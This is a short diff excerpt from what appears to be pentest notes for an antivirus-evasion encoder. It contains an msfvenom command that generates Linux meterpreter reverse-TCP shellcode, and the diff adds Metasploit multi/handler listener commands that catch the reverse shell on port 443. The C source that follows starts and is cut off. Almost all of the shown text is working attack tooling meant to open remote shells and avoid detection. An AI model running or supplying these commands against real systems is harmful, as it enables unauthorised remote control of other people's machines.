@@ -4,7 +4,14 @@ Encoder for program to avoid detection
 Use to generate shellcode:
 msfvenom -p linux/x64/meterpreter/reverse_tcp lport=443 lhost=192.168.45.199 -f c 
 
-
+Listener#
+FOR C in Linux
+sudo msfconsole -q
+use multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost 192.168.119.120
+set lport 443
+exploit
 
 #include <stdio.h>
 #include <stdlib.h>
